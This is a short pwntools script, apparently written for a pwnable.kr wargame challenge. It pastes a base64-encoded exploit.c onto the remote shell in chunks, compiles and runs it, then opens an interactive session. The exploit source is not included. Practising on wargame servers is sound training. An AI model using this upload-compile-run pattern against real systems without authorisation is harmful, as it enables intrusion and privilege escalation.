import base64
from pwn import *

r = remote("pwnable.kr", "10052")

with open("exploit.c", "rb") as f:
    content = f.read()

encoded = base64.b64encode(content).decode()
CHUNK = 900

r.recvuntil(b"/ $ ")
r.sendline(b"cd /tmp")

r.recvuntil(b"/tmp $ ")
r.sendline(b": > exploit.b64")

for i in range(0, len(encoded), CHUNK):
    chunk = encoded[i:i+CHUNK]
    r.recvuntil(b"/tmp $ ")
    r.sendline(f"printf '%s' '{chunk}' >> exploit.b64".encode())

r.recvuntil(b"/tmp $ ")
r.sendline(b"base64 -d exploit.b64 > exploit.c && gcc -pthread exploit.c && ./a.out")
r.interactive()

